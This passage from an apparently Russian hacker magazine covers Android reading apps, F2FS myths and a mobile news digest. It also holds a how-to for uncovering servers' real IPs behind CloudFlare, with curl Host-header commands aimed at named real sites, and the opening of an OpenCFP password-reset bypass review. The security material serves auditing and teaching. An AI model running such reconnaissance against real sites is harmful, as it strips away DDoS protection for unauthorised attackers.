   только в этом формате, например различные методички в институте), скуд-
   ный выбор фоновых рисунков и не самый интуитивно понятный интерфейс.
•  Moon+ Reader. Форматы файлов: EPUB, FB2, PDF, Mobi, CHM, CBR, CBZ,
   UMD, TXT, HTML и OPDS, не хватает поддержки DjVu. Управление програм-
   мой удобное, а функций бесплатной версии вполне достаточно рядовому
   пользователю (pro-версия обойдется в 300 рублей).
•  FBReader. Форматы файлов: FB2, EPUB, EPUB3, Kindle (azw или mobipocket),
   RTF, HTML, plain text. Для поддержки форматов PDF, DjVu, CBR требуется
   установка плагинов. Одна из первых читалок, появившихся на Android. Ра-
   ботает даже с очень старыми смартфонами, но какими-то особо интерес-
   ными возможностями не отличается. Полностью бесплатна.





                           PocketBook                                FBReader

Все читалки поддерживают синхронизацию чтения через Dropbox: ты мо-
жешь начать читать на одном устройстве, а продолжить на другом. Более того,
FBReader умеет складывать все открытые в нем книги в Dropbox или Google
Drive, так что они будут доступны на всех устройствах.
   Кстати, для синхронизации книг очень удобно использовать приложение
Dropsync. Просто положи все книги в какую-нибудь папку в своем Dropbox,
а затем настрой Dropsync для синхронизации этой папки с устройством. Ре-
комендую отключить автосинхронизацию — она выжирает батарейку — и син-
хронизировать вручную по мере необходимости.

PDF
PDF — особый формат документа, который выглядит в любом просмотрщи-
ке одинаково, независимо от размера экрана, разрешения и значения DPI.
И в этом же его недостаток: читать PDF на смартфоне — просто мучение. Если
открываешь на полный экран, текст становится слишком мелким, а при увели-
чении появляется не только вертикальная прокрутка, но и горизонтальная. Од-
ним словом: PDF не для смартфонов.
  Но выход все же есть. Бесплатный Adobe Acrobat Reader умеет перестра-
ивать документ для более удобного чтения на маленьком экране мобильного
устройства. При активации режима чтения (значок очков снизу) он поступает
с документом ровно так же, как книгочиталка с обычной книгой, то есть уста-
навливает комфортный для чтения размер текста и активирует корректный пе-
ренос строк. Естественно, таблицы, сноски, оглавления и прочее в этом слу-
чае «поедут», но документ хотя бы можно читать.
   Та же функция есть в PocketBook. Но в скорости и качестве переформати-
рования он проигрывает Adobe Reader. А вот в Moon+ Reader перекомпонов-
ка PDF под маленький экран реализована не очень удобно: лист сжимается
и прокручивается горизонтально.





  Документ в оригинальном формате              ...и после переформатирования

DOCX И DOC
Для чтения офисных документов существует очень много программ, но я со-
ветую установить Microsoft Word. Ключевое преимущество — абсолютно пра-
вильное отображение разметки любых DOC- и DOCX-файлов. А качественно
проработанная функция конвертирования документа для чтения на маленьком
экране мобильного устройства (режим чтения) позволяет вообще забыть про
всех конкурентов.
  По сравнению с настольной версией возможности редактирования силь-
но урезаны. Отсутствуют многие нужные функции, например редактор формул,
некоторые функции доступны только при подписке на Office 365. После изме-
нения DOC-файлы можно сохранить только в DOCX, который совместим лишь
с Microsoft Office 2007 и выше. Зато есть поддержка чтения и редактирования
ODT, DOT и RTF.





  Документ в оригинале                               ...и в режиме чтения

Вместо Word и других продуктов Microsoft можно использовать сторонний
офис. Один из лучших — OfficeSuite, самый настоящий комбайн с кучей функ-
ций и относительно хорошей совместимостью с файлами офиса (читает PDF,
RTF, TXT, LOG, CSV, EML, ODT, ODS, ODP, DOC, DOCX, DOCM, XLS, XLSX,
XLSM, PPT, PPTX, PPS, PPSX, PPTM, PPSM, а также ZIP-архивы). Если функцио-
нальности бесплатной версии не хватит, то придется выложить около 1000 ру-
блей за полную версию приложения. Главное, не забывай поговорку: «Универ-
сальное — значит, умеет всё, но толком ничего».

СТАТЬИ
Ок, с книгами и документами разо-
брались, но как быть со статьями
на сайтах? Во-первых, не каждый раз
находится время сразу прочитать ста-
тью, ссылка на которую подвернулась
в ленте твиттера, а во-вторых, читать
статью не всегда удобно: сайты ис-
пользуют различные шрифты и их раз-
меры, бывает так, что фон режет глаза
или же владельцы сайта не позаботи-
лись о создании мобильной версии.
  Все эти проблемы решит Pocket.
Это сервис так называемого отложен-
ного чтения. Он позволяет сохранить
понравившиеся статьи для последу-
ющего чтения, нажав кнопку «Отпра-
вить» в браузере и выбрав Pocket (или
с помощью специального расшире-
ния для браузера). Затем можно от-
крыть приложение и прочитать статью
в чистом и удобном для мобильно-
го устройства виде с выбором фона,
размера и стиля шрифта и обрезкой
всего лишнего (статья будет выгля-
деть так же, как книга в книгочиталке).
   Сразу после добавления в Pocket
страница автоматически загружается                     Статья с хабра в Pocket
на все устройства и становится до-
ступна в офлайне. Так что ты можешь
заранее сохранить множество статей, а затем спокойно читать их в дороге,
не обращая внимания на проблемы с интернетом.
  Ближайший конкурент Pocket — Instapaper функционально абсолютно с ним
идентичен. Похожая функция чтения встроена и в некоторые браузеры, напри-
мер в Firefox и Яндекс.Браузер. Достаточно всего лишь нажать на значок от-
крытой книги в адресной строке.

НОВОСТИ
Пожалуй, чаще всего мы читаем новости. У новостей есть множество источ-
ников, это и твиттер, и Telegram, и RSS. Но существуют и специальные агрега-
торы, которые подберут новости именно для тебя. Таких в маркете довольно
много, но внимания заслуживают только три:
•  Google Новости и погода — простой агрегатор новостей. Имеется со-
   ртировка по любым темам, а также индивидуальные подборки. Есть очень
   удобная сортировка по ключевым словам, подробная информация о пого-
    де.
•  Flipboard — читалка новостей, выполненная в формате красивого бумаж-
   ного журнала с интуитивно понятным интерфейсом. Собственно, в этом
   единственное ее достоинство.
• MSN Новости — очень популярная читалка новостей от  Microsoft.





                         Google Новости                                4PDA

Не стоит забывать и про специальные приложения для чтения сайтов:
•  4PDA — официальный клиент для чтения форума 4PDA и новостей сайта.
   Значительно удобнее, быстрее и экономичнее сайта форума в браузере.
   К тому же позволяет беречь заряд батареи.
•  XDA — то же самое для просмотра форума XDA.

ТЕКСТОВЫЕ ФАЙЛЫ И КОД
Чтение не ограничивается книгами, статьями и документами. Читать и редак-
тировать можно текстовые файлы с различными кодировками, а программный
код во многих редакторах отображается с подсветкой синтаксиса. Наиболее
интересные редакторы:
•  Vim Touch — порт очень известного консольного редактора.
•  Turbo Editor — приятный Material Design, множество функций. Очень боль-
   шой выбор и корректное распознавание кодировок документа. Редактор
   умеет подсвечивать синтаксис большого количества языков программи-
   рования и всегда правильно распознает кодировку. Есть поддержка root
   для редактирования системных файлов.
•  DroidEdit — один из самых популярных редакторов с подсветкой синтакси-
    са, но он не всегда корректно распознает кодировку.
•  Встроенный текстовый редактор ES Проводник. Легко читает очень боль-
   шие файлы, без проблем редактирует системные файлы, требующие прав
   суперпользователя (в режиме root-прав у файлового менеджера). Главные
   недостатки — отсутствие подсветки синтаксиса, не всегда корректное рас-
   познавание кодировок.

Справочники

Не стоит пренебрегать разными
приложениями-справочниками. За-
частую они удобнее браузера и/или
доступны в офлайн-режиме. Отлич-
ные примеры:
•  WikiRoutes — справочник обще-
   ственного транспорта;
•  C++ Учебник — учебник по C++;
•  CMDLinux — справочник команд
    Linux;
•  Windows Command Help — спра-
   вочник команд Windows;
•  GymUp — база упражнений и тре-
   нировочных программ для прокач-
   ки мышц;
•  Мастерская райдера — спра-
   вочник от журнала MountainBIKE
   Magazin по ремонту и обслужива-
   нию горных велосипедов.





                                                                   CMDLinux



ПОЛЕЗНЫЕ СОВЕТЫ
1. Порой книгу удобнее слушать, чем читать. Но что, если книги просто нет
   в аудиоформате? В этом случае поможет синтезатор речи. Один из самых
   известных — синтезатор речи Google. Его поддерживают многие книгочи-
   талки, так что проблем не будет. Можно использовать @Voice Aloud Reader —
   специальную читалку голосом. Она умеет открывать различные типы файлов
   с текстом или веб-страницы и читать их. Также ей можно отдать страницу
   или выделенный текст с помощью стандартного механизма «Отправить».
2. Ученые доказали, что воздействие синего цвета (в некоторых источниках
   сказано, что еще и фиолетового) на сетчатку глаза в несколько раз бо-
   лее опасно, чем весь оставшийся диапазон видимого света. Воздействие
   оттенков синего перед сном расстраивает природные ритмы, уменьшая
   выработку мелатонина (гормон, регулирующий суточные ритмы), что вы-
   зывает проблемы с засыпанием. Поэтому при частом или продолжитель-
  ном чтении на смартфоне (особенно перед сном) рекомендуется поль-
   зоваться фильтрами синего цвета. Это заметно снизит нагрузку на глаза.
  В Play Store таких фильтров очень много. Например, «Фильтр синего све-
   та», или другой «Фильтр синего света», или Twilight. В прошивках некоторых
   аппаратов есть специальный режим чтения, он тоже фильтрует синий цвет.
  В CyanogenMod данный режим называется LiveDisplay и находится в на-
   стройках дисплея.
3. В некоторых моделях устройств дисплей не горит постоянно, а быстро мер-
   цает (как, например, в ASUS MeMO Pad 7), что невооруженным зрением мо-
   жет быть не заметно, но приводит к сильному утомлению глаз: уже через
   несколько минут чтения они в буквальном смысле болят. Так что если ты со-
   бираешься подолгу пялиться в устройство, то не поленись найти в интерне-
   те обзоры, где проверят, не мерцает ли дисплей в твоем устройстве.
4. Следует знать, что на некоторых девайсах минимальная яркость сильно за-
   вышена. Почти всегда это можно решить с помощью специальных программ
   для установки яркости ниже минимальной. Один из примеров такого прило-
   жения — Screen Filter.
5. Для чтения все-таки лучше подходят электронные книги с E Ink дисплеем.
  Они используют отраженный свет и естественны для глаз. Почти как бумаж-
   ные книги.

ЗАКЛЮЧЕНИЕ
Используя правильные инструменты и следуя приведенным в статье советам,
можно существенно облегчить чтение текста на устройстве даже с очень не-
большой диагональю экрана. Сегодняшние смартфоны и софт могут перева-
рить практически любой формат документа и сделать чтение статей с сайтов
гораздо более простым и удобным.
MOBILE: Колонка Евгения Зобнина
  МИФЫ
   О ФАЙЛОВОЙ
   СИСТЕМЕ F2FS





                      Евгений Зобнин
                                                    zobnin@gmail.com



В среде моддеров и энтузиастов Android, как и в любой сек-
те, есть несколько святынь, которые принято почитать несмотря
ни на что. Это оптимизированные кастомные ядра, скрипты и при-
ложения для оптимизации системы, «улучшатели» звука и многое
другое. В последнее время к ним добавилась файловая система
F2FS, которая, согласно многим свидетельствам, существенно
поднимает производительность работы с NAND-памятью и сохра-
няет ее от износа. Но так ли это на самом деле?





Впервые F2FS (Flash Friendly File System) предстала людскому взору в октя-
бре 2012 года, когда компания Samsung опубликовала патчи с ее реализаци-
ей для ядра Linux. По словам разработчиков, ФС была с нуля спроектирована
специально для flash-памяти и позволяла повысить производительность чте-
ния/записи таких накопителей и использовать их особенности для некоторых
оптимизаций и защиты от износа.
  Уже к концу года F2FS стала официальной частью Linux 3.8, а еще через
некоторое время ее поддержка появилась в CyanogenMod 10.2 и кастомном
рекавери TWRP. С тех пор моддеры и оптимизаторы включают ее во все свои
каcтомные ядра, пишут массу хвалебных отзывов, публикуют скриншоты с до-
казательством феноменальной производительности файловой системы.
  Со стороны все это выглядит более чем обнадеживающе, поэтому новички
в Android дружно вступают в ряды тех, кто прикоснулся к прекрасному и заимел
это прекрасное в своем смартфоне. Вот только мало кто задумывается о том,
почему родившая на свет чудо Samsung сама не использует F2FS даже в своих
последних флагманах.
  А причина проста: F2FS практически ничем не лучше файловой системы
ext4, используемой в Android по умолчанию. Чтобы не быть голословным, раз-
беру два основных мифа, касающихся F2FS: производительность и бережное
отношение к flash-накопителям.

ПРОИЗВОДИТЕЛЬНОСТЬ
В Сети можно найти множество примеров сравнения производительности
ext4 и F2FS. Они очень похожи и очень часто показывают огромный выигрыш
последней в скорости записи данных. Вот, например, результаты сравнения
AndroBench для смартфона Sony Experia Z1:





                                F2FS vs ext4

Выглядит странно, не так ли? Скорость случайной записи возросла в 150 раз
в сравнении с ext4 и в шесть раз в сравнении со скоростью чтения. Впервые
такую аномалию заметили журналисты Phoronix, когда проводили тестирова-
ние F2FS в начале 2013 года:.





                                   Аномально высокая производительность F2FS

Тогда они резонно предположили, что на самом деле F2FS пишет данные
на диск не сразу, а вместо этого кеширует их для последующей записи. Если
взглянуть на архитектуру F2FS, становится очевидно, что это действительно
так. F2FS работает с блоками данных размером 4 Кбайт, объединяя их в сег-
менты размером 2 Мбайт, а те, в свою очередь, объединяются в секции, кото-
рых может быть до шести штук.
   Зачем нужна такая система, мы поговорим позже, а пока остановимся толь-
ко на том, что перед записью в память секции должны быть заполнены блоками.
Другими словами, F2FS собирает записываемые 4-килобайтные блоки данных
в куски большего размера, а затем скидывает их на диск одновременно. Это
и есть причина аномально высокой производительности F2FS в скорости за-
писи случайного 4-килобайтного блока и вполне сравнимой с ext4 производи-
тельности последовательной записи множества блоков.
   Последние тесты Phoronix также подтверждают практически равную произ-
водительность обеих файловых систем. F2FS заметно вырвалась вперед толь-
ко в тесте на одновременную работу с тысячами файлов, что обусловлено ее
внутренними оптимизациями. Однако ни один смартфон не работает одно-
временно с таким количеством файлов. Такая ситуация редкость даже на де-
сктопе и специфична для серверов.





                        Тест скорости случайной записи в разных версиях ядер (4.4–4.7)


БЕРЕЖНОЕ ОТНОШЕНИЕ К НАКОПИТЕЛЮ
Второе заблуждение относительно F2FS связано с более бережным отноше-
нием к flash-памяти. Все мы знаем, что flash-память — штука хрупкая и выдер-
живает всего несколько тысяч циклов записи/стирания данных. По этой при-
чине размещать данные на flash-накопителе рекомендуется в формате лога,
когда новые блоки не перезаписывают старые, а вместо этого пишутся в неза-
нятую область, после чего старый блок помечается как неиспользуемый и впо-
следствии очищается, освобождая пространство.
  Именно так работает F2FS, и именно поэтому многие люди считают ее луч-
шим выбором для flash-памяти в сравнении с ext4, работающей по классиче-
ской схеме, которая предполагает изменение данных на месте. Но есть один
нюанс. Дело в том, что абсолютно любая современная флеш-память, начиная
от USB-флешек и заканчивая серверными SSD, содержит в себе контроллер
FTL (Flash Translation Layer), отвечающий за то, чтобы представить совсем не-
похожую на магнитные диски флеш-память как обычный диск, на который мож-
но записать определенное количество блоков данных.
  Помимо таких вещей, как объединение нескольких чипов flash-памяти
в один «диск» и выполнение операции TRIM, которая очищает уже не исполь-
зуемые блоки, FTL также ответственен за выбор физического размещения за-
писываемого блока в памяти. И здесь он использует (сюрприз!) log-структу-
рированную мини-ФС. Другими словами, любая современная флеш-память
сама занимается увеличением своего срока службы независимо от того, ка-
кую файловую систему ты на ней создашь: F2FS, ext4, FAT32 или любую дру-
гую, — результат будет один.
  На самом деле причина, по которой F2FS называется «дружественной
к флеш-памяти» (Flash Friendly), вовсе не в бережном отношении к памяти,
а в том, что она умеет учитывать некоторые ее особенности, чтобы сделать ра-
боту с памятью более эффективной. Один из примеров увеличения эффектив-
ности — это тот самый механизм объединения данных в секции.
  Дело в том, что многие микросхемы флеш-памяти включают в себя не один,
а несколько независимых накопителей. И запись в каждый из них может про-
исходить одновременно. Объединяя данные в секции, F2FS может отправить
их на запись одновременно, что в теории приведет к увеличению производи-
тельности записи в число раз, кратное количеству накопителей.
  Но и здесь не все так просто. Все оптимизации F2FS требуют индивидуаль-
ной настройки файловой системы для каждой модели flash-памяти. Файловая
система будет настолько эффективной, насколько точно ее настроили. И де-
лать это должен не пользователь кастомной прошивки, а сам производитель
памяти, потому как только он может знать все нюансы ее устройства.

ИТОГО
F2FS — отличная файловая система. Об этом говорит хотя бы тот факт, что,
только появившись на свет, она уже способна успешно конкурировать с выли-
зываемой годами и сотнями людей ext4. Однако не стоит ждать от нее чудес
и бежать форматировать свое устройство. Да, многие люди заявляют о за-
метном даже без тестов увеличении производительности, но опять же, ско-
рее всего, эти эффекты вызваны тем самым механизмом отложенной записи
и на самом деле никакого существенного прироста скорости нет.
MOBILE
МОБИЛЬНЫЙ ДАЙДЖЕСТ
 СЕНТЯБРЯAPPLE AIRPODS, СМЕРТЬ BLACKBERRY
     И САМЫЙ БЫСТРЫЙ ЭМУЛЯТОР ANDROID





                                           Евгений Зобнин
                                                   zobnin@gmail.com





Сегодня в выпуске: Apple собралась совершить револю-
цию, взрывающиеся Note 7, смерть BlackBerry и Firefox OS,
еще одна операционка от Google, самый быстрый эмуля-
тор Android, руководство по обеспечению безопасности
Android-приложений, рассказ о методе копирования памя-
ти Apple iPhone 5c.

СОБЫТИЯ
Главное событие сентября — это, конечно же, выпуск новых моделей iPhone,
Apple Watch и беспроводных наушников AirPods. И если первые не принесли
чего-то действительно нового, кроме совершенно непрактичного черного ва-
рианта цвета и отсутствия 3,5-миллиметрового джека для подключения науш-
ников (который даже нельзя высверлить), то AirPods стали не просто новым
взглядом на периферийное устройство, а первым шагом Apple на пути к буду-
щему, каким его видит компания.
    AirPods не просто дорогой аксессуар, который легко потерять. Это полно-
ценный компьютер (два компьютера!), способный определять, находится ли
наушник в ухе, и автоматически ставить воспроизведение на паузу, если это
не так. Он следит за твоим ртом и приглушает громкость во время разговора,
он переключается в монорежим, когда ты вынимаешь один из наушников, мо-
жет без всякого дополнительного спаривания работать с любым из твоих гад-
жетов и вызывать Siri в ответ на двойной тап по наушнику.





                                                                            AirPods


В дальнейшем мы наверняка увидим еще большее развитие интеллекта AirPods,
а когда Siri наконец научится вести нормальный человеческий диалог, Apple во-
йдет в историю как компания, создавшая реальный гаджет из фильма «Она».
  В сентябре отличилась и Samsung, всегда считавшая себя главным кон-
курентом Apple. Но аналога AirPods они не создали, а всего лишь выпустили
на рынок Galaxy Note 7 со взрывоопасной батареей. Проблема, как выясни-
 лось, была в том, что в стремлении сделать девайс как можно тоньше компа-
ния нарушила техпроцесс производства аккумуляторов. В результате по всему
миру у поклонников продукции Samsung начало в прямом смысле «бомбить».
Авиакомпании запретили включать девайс на борту, акции Samsung рухнули.
   Первое, что сделала Samsung, — это выпустила специальное обновле-
ние, которое просто ограничивает максимальный заряд аккума 60 процен-
тами. Позже компания начала заменять устройства пользователя на новые,
с исправленной батареей, и даже получила у Google разрешение сделать
цвет значка батареи в таких девайсах зеленым (Google требует, чтобы значки
в строке состояния были монохромными серыми или белыми). Однако, как за-
являют многие владельцы, программа обмена смартфона работает из рук вон
плохо, так что, скорее всего, Samsung придется еще долго отмываться от этой
истории.





                                                             Взорвавшийся
                                                                        Galaxy Note 7



Не обошлось и без печальных новостей. В конце месяца BlackBerry офи-
циально заявила, что прекращает производство смартфонов и переклю-
чается на разработку ПО. Судя по всему, такое решение было принято уже
давно, вскоре после релиза BlackBerry Priv: уже несколько месяцев «разраба-
тываемый» смартфон BlackBerry DTEK50 оказался как две капли воды похож
на Alcatel Idol 4. Теперь понятно, что это он и есть, очевидно — с собственной
версией прошивки от BlackBerry и ее же сервисами.
   Вторую печальную новость принесла Mozilla. Они окончательно отказались
от разработки и поддержки Firefox OS и планируют в ближайшее время выпи-
лить весь код, касающийся мобильной ОС, из движка Gecko. Сама Firefox OS
останется в руках сообщества, но, как подчеркивает Mozilla, без соответству-
ющей поддержки в движке Gecko проект будет очень трудно развивать.
   Ну и очередная новость от поискового гиганта: Google разрабатывает но-
вую операционку Andromeda, которая должна стать чем-то вроде сплава
Android и Chrome OS. О возможном объединении проектов компания начала
говорить еще в прошлом году, и теперь мы получили подтверждение этой за-
 теи: в исходниках Android 7.0 есть прямое упоминание новой ОС.





                              Упоминание Andromeda в исходных текстах Android 7.0


По слухам, Google представит Andromeda уже четвертого октября, а выход
первого устройства на ее базе должен произойти в конце 2017 года. Это будет
ноутбук Pixel 3, стоимостью 799 долларов. Сама же операционка будет спла-
вом Android и Chrome OS с перекосом в сторону первого. То есть не Chrome
OS, способная запускать Android-приложения, а, скорее, Android, функцио-
нально похожий на Chrome OS.

РЕЛИЗЫ
В середине сентября компания Jide, известная как разработчик операцион-
ной системы Remix OS, представляющей собой Android с многооконным ин-
терфейсом, выпустила новый продукт — Remix OS Player. Как ни странно, это
эмулятор Android для Windows, созданный на базе стандартного эмулятора
из комплекта Android Studio и отличающийся использованием Remix OS вме-
сто стандартного Android.
   Пока эмулятор доступен исключительно для Windows и страдает от про-
блем c производительностью и предустановленным Play Store. Но, как заявля-
ют разработчики, это самый быстрый эмулятор из всех существующих в дан-
ный момент.





                                                               Remix OS Player


ИНСТРУМЕНТЫ
 Droid-hunter — инструмент для анализа Android-приложений. Умеет выводить
информацию о пакете, включая манифест и используемые привилегии, деком-
пилировать и дизассемблировать код и выполнять автоматизированный поиск
уязвимостей (penetration testing).





                                                                           Droid-hunter


ПОСМОТРЕТЬ
Безопасность Android-приложений — Дмитрий Лукьяненко рассказывает
о том, как надо и как не надо писать безопасные приложения для Android. Лек-
ция охватывает многие проблемы Android-приложений, включая экспортиру-
емые сервисы, неявные интенты, протекающие контент-провайдеры, ошибки
типа path traversal и так далее. В целом довольно познавательная лекция, кото-
рая может оказаться полезной разработчикам и реверсерам, интересующим-
ся безопасностью приложений. Но более-менее подготовленный разработчик
не откроет для себя ничего нового.

Android Performance — Nougat vs Marshmallow — сравнение производительно-
сти Android 6.0 и 7.0. Вывод: 6.0 быстрее. Проблема только в том, что, ско-
рее всего, автор видео некомпетентен. Android 7.0 использует гибридный JIT/
OAT-компилятор, поэтому полную трансляцию байт-кода установленного при-
ложения в нативный код ARM он выполняет не сразу, а раз в день при подклю-
чении к заряднику. Сразу после установки исполнение приложения происхо-
дит практически так же, как в Android 4.X, то есть только с задействованием
JIT-компилятора.

ПОЧИТАТЬ
 Android 7.0 for Developers — официальная документация Android 7.0 для раз-
работчиков. Статья рассказывает, как адаптировать свое приложение к мно-
гооконному режиму, использовать новые возможности уведомлений, оптими-
зировать приложения с целью сохранения заряда аккумулятора, использовать
 Vulkan API, пришедший на смену OpenGL, добавить собственную кнопку в па-
нель быстрых настроек, адаптировать приложения для режима Direct Boot и так
далее.

Keeping Android safe: Security enhancements in Nougat — краткий список всех
повышающих безопасность нововведений в Android 7.0: режим Direct Boot,
шифрование файлов по отдельности вместо всего пользовательского разде-
 ла, применение seccomp, разделение MediaServer’а на множество сервисов
и многое другое. Почти обо всех этих новшествах мы уже писали.

Doctor Web: Android.Xiny Trojans have learned how to infect system processes —
разбор трояна Android.Xiny.60 от компании Dr.Web. Троян получает права
 root на устройстве и копирует свои компоненты в каталог system, затем с по-
мощью ptrace внедряет свою библиотеку в Google Play, Google Play Services
и Zygote — родительский процесс всех запускаемых в системе приложений.
   После внедрения в Zygote троян мониторит запуск приложений и внедря-
ет в них Java-код igpi.jar, который отправляет на сервер информацию о смарт-
фоне: IMEI, IMSI, MAC-адрес, версию ОС, модель устройства и прочее. Тро-
ян способен расширять свою функциональность с помощью загружаемых
модулей, а также перехватывать и отправлять сообщения (если он внедрен
в соответствующее приложение) и получать информацию о кредитных картах
и паролях пользователя, попадая в клиент банка (какие банки поддерживают-
ся — непонятно).
    Android.Xiny был найден как на варезных сайтах, так и в Google Play.
   The bumpy road towards iPhone 5c NAND mirroring (pdf) — рассказ об успеш-
ном эксперименте по клонированию NAND-памяти iPhone 5c, который мог
бы помочь ФБР сэкономить полтора миллиона долларов. Суть метода очень
проста: так как подобрать PIN-код брутфорсом в iPhone невозможно из-за
ограничения на число попыток, автор предлагает скопировать NAND-память
устройства, затем несколько раз попробовать ввести PIN, залить содержимое
NAND обратно (сбросив счетчик попыток) и вновь попробовать ввести PIN —
и так множество раз.
   Хотя сам метод и выглядит простым, для его реализации без джейлбрей-
ка автору пришлось расковырять проприетарный протокол передачи данных
между NAND-чипом и найти методом проб и ошибок правильные пины для сли-
ва с него информации.





                                                  Плата iPhone 5c с выведенной
                                                  наружу NAND-памятью
ВЗЛОМ



       WARNING

            Вся информация предоставлена исключительно в ознакомительных целях.
             Лица, использующие данную информацию в противозаконных целях, могут
            быть привлечены к ответственности.
EASY





      ВЫЧИСЛЯЕМ РЕАЛЬНЫЙ IP СЕРВЕРАHACKЗА CLOUDFLARE/QRATOR





                                                         aLLy, ONSEC,
                                                            @iamsecurity



Сегодня все большее распространение получают серви-
сы для защиты от DDoS-атак, скрывающие реальный IP-а-
дрес, типа CloudFlare, Incapsula и Qrator. Думаю, не имеет
смысла объяснять, насколько бывает важно и полезно
определить реальный IP-адрес сервера. Поэтому в дан-
ной заметке я поделюсь алгоритмом, которого придержи-
ваюсь во время аудитов, когда приходится участвовать в
игре «Найди мой реальный IP».
Метод 1: поддомены

Первый шаг, который я предлагаю сделать, — это найти поддомены и прове-
рить их IP. Для поиска я использую тулзу Sublist3r от Aboul-Ela и словарь. Далее
отбрасываем все адреса, что принадлежат хидеру. И затем к оставшимся про-
буем подключиться с кастомным хидером Host. Для этого я накидал простень-
кий скрипт на баше.
   Этот способ, кстати, используют большинство сервисов вроде Cloudflare
resolver. К сожалению, этот метод все реже приносит сколько-нибудь зна-
чимые результаты, потому что большинство таки научилось правильно на-
страивать DNS. Однако поиск поддоменов в любом случае крайне полез-
ная вещь, особенно при блекбоксе. Так что делаю это в первую очередь.

Метод 2: history

Второй шаг простой, но в то же время наиболее эффективный. Смысл в том,
чтобы найти старый IP-адрес домена. Быть может, сейчас он скрыт, но раньше,
возможно, он был «голым».
  Для просмотра истории изменения IP есть несколько сервисов. На-
пример, мои любимые http://viewdns.info/iphistory/ и http://ptrarchive.com/
спасали мою задницу не один раз. Эти сервисы сейчас пока бесплатны
(к сожалению, большинство сервисов такого плана переходят на платную
основу).
  Для  примера  возьмем  сайт  https://www.baincapital.com/. Он  за-
щищен  CloudFlare, смотрим в историю —  http://viewdns.info/iphistory/
?domain=baincapital.com.
   Видим, что раньше домен резолвился на IP 162.218.138.176, перейдем
на него в браузере. Наблюдаем главную страницу Bain Capital, также мож-
но заметить, что сертификат выдан на имя baincapital.com. Хороший знак,
сравним с оригинальным сайтом https://baincapital.com — они идентичны.





                              Проверка реального IP-адреса домена и сертификата





                                    История IP-адресов для домена baincapital.com


Встречаются ситуации, когда переход по айпи не дает нужного результата,
а возвращает, например, дефолтную страницу веб-сервера, или ошибку
404, или 403, или что-то подобное. В таких случаях не забывай пробовать
подключаться с указанием Host’а:

curl -H "Host: www.baincapital.com" https://162.218.138.176 -k

Метод 3: DNS

Этот шаг — продолжение предыдущего. Нужно проверить историю изменения
DNS и попробовать отрезолвить IP домена через старые NS-серверы.
  Для просмотра истории я использую DNS Trails (http://dnstrails.com/),
DNS History и WhoISrequest. Для доменов .ru, .su и .рф можно восполь-
зоваться сервисом WhoisHistory. Затем пробуем резолвить стандартным
dig’ом, например:

dig @old.ns.server.pes.com pes.com

Метод 4: специализированные поисковики

Пробую искать подопытный домен на Censys и Shodan. Кроме того что это по-
зволяет расширить скоуп и выявить новые точки входа, там можно обнаружить
и реальный IP.
  Я люблю максимально автоматизировать операции, поэтому, исполь-
зуя jQuery и консоль браузера, быстренько выуживаю все IP со страницы
результатов поиска:

$('span.ip a').each(function(n,e){console.log($(e).prop("href").
    split("v4/")[1])});

Записываю их в файл, и затем снова в дело вступает скрипт из первого
шага.

Метод 5: email

Этот метод мне засветил @i_bo0om, за что ему огромное спасибо. Идея в том,
чтобы получить email от сервиса и проверить хидеры письма на наличие инте-
ресной информации. Тут проще показать, чем объяснять.
  Возьмем какой-нибудь https://shop.eurovision.tv/. Тут снова CloudFlare.
Регистрируемся там, ждем письмо с подтверждением и смотрим хидеры; в
частности, нас интересует Recieved:

Recieved: esc-web4-tng.virtu.nl (77.222.68.234)

Далее в дело еще раз вступает curl и Host-хидер:

curl -H "Host: shop.eurovision.tv" -k https://77.222.68.234

Вуаля! Реальный адрес найден, дальше можно работать без ограничений
CloudFlare.





                                Хидеры письма, раскрывающие IP-адрес сервера





                                                Найденный IP-адрес домена

На этом у меня все. Надеюсь, представленная информация будет полезной.
До новых встреч!
                                                                               Борис Рютин,
                                                                                                                              Digital Security
                                                                                                        b.ryutin@dsec.ru
                                                                                       @dukebarman
     WARNING                                                                       dukebarman.pro

       Вся информация
     предоставлена исклю-
       чительно в ознако-
       мительных целях.
     Ни редакция, ни автор
     не несут ответственно-
      сти за любой возмож-
    ный вред, причиненный
      материалами данной
             статьи.

ОБЗОР
ЭКСПЛОИТОВ
   АНАЛИЗ НОВЫХ УЯЗВИМОСТЕЙ





  В сегодняшнем обзоре мы рассмотрим уязвимость в популярной
      библиотеке для аутентификации пользователей, которая
  применяется на конференциях для приема докладов. Не обойдем
    стороной и новое исследование IoT-устройства, проведенное
   командой Pen Test Partners, а потом разберем XSS-уязвимость
                     в роутере TP-Link Archer.


ОБХОД АУТЕНТИФИКАЦИИ В OPENCFP (ИЛИ SENTRY FRAMEWORK)

 CVSSv2:     Нет
 Дата релиза: 5 сентября 2016 года
 Автор:        haxx.ml
 CVE:         нет

OpenCFP — это популярная система для принятия докладов на конференци-
ях. Она написана на PHP, и исходники открыты. Но найденная уязвимость на-
ходится не в ней, а в одном из сторонних компонентов — фреймворке Sentry
фирмы Cartalyst. Он используется во многих других приложениях, так что есть
вероятность того, что они до сих пор уязвимы.





                                       Статистика по установкам фреймворка Sentry

Как и в большинстве веб-приложений, в OpenCFP есть функция восстановления
пароля. Она позволяет пользователям получить специальную ссылку по email
и затем установить новый пароль. Такая ссылка ведет на страницу с формой
для ввода пароля.





                                            Форма установки нового пароля


После нажатия на кнопку Change my Password отправляется следующий
POST-запрос на сервер.

POST /updatepassword HTTP/1.1
Host: domain
Referer:
http://domain/reset/2/vab9HtPIfIw2f6WLrzzidEbApaepDSGm9PkUKyKvZr
[...]
reset[_token]=x&reset[password][password]=passw0rd&reset[password]
   [password2]=passw0rd&reset[user_id]=2&reset[reset_code]=
   vab9HtPIfIw2f6WLrzzidEbApaepDSGm9PkUKyKvZr

После того как приложение получит этот запрос, оно проверит, соответству-
ет ли параметр reset[reset_code] значению reset_password_code в записи
базы данных о пользователе с [user_id]. OpenCFP использует Sentry для этой
проверки во множестве случаев аутентификации.

EXPLOIT
К ошибке приводят две вещи. Первая связана с тем, как Sentry выполняет про-
верку, вторая — с тем, что у пользователей, которые не восстанавливали пароль,
по умолчанию в поле reset_password_code установлено NULL. Это хорошо вид-
но на схеме таблицы users в базе данных Sentry.





                                                  Схема таблицы users из Sentry


Отсутствуют и дополнительные проверки перед передачей данных из OpenCFP
в Sentry, то есть проводятся только обычные проверки на вводимые данные.
К тому же в примере использования этой функции в документации Sentry нет
никакого упоминания о типах вводимых данных.
  Ниже представлена функция в Sentry, отвечающая за сверку кода из запро-
са с кодом, который находится в базе. Эта функция проста и возвращает true
в случае совпадения или false, если совпадения не найдено.





